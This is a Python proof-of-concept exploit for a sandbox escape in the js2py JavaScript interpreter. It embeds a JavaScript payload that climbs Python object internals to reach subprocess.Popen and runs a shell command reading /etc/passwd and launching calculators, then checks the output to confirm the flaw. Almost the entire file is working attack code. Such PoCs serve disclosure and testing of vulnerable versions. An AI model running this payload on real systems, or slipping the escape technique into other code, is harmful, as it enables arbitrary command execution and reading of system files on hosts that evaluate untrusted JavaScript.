import js2py
from sys import version

payload = """
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

def test_poc():
    etcpassword_piece = "root:x:0:0"
    result = ""
    try:
        result = repr(js2py.eval_js(payload))
    except Exception:
        return False
    return etcpassword_piece in result

def main():
    if test_poc():
        print("Success! the vulnerability exists for python " + repr(version))
    else:
        print("Failed for python " + repr(version))

if __name__ == "__main__":
    main()
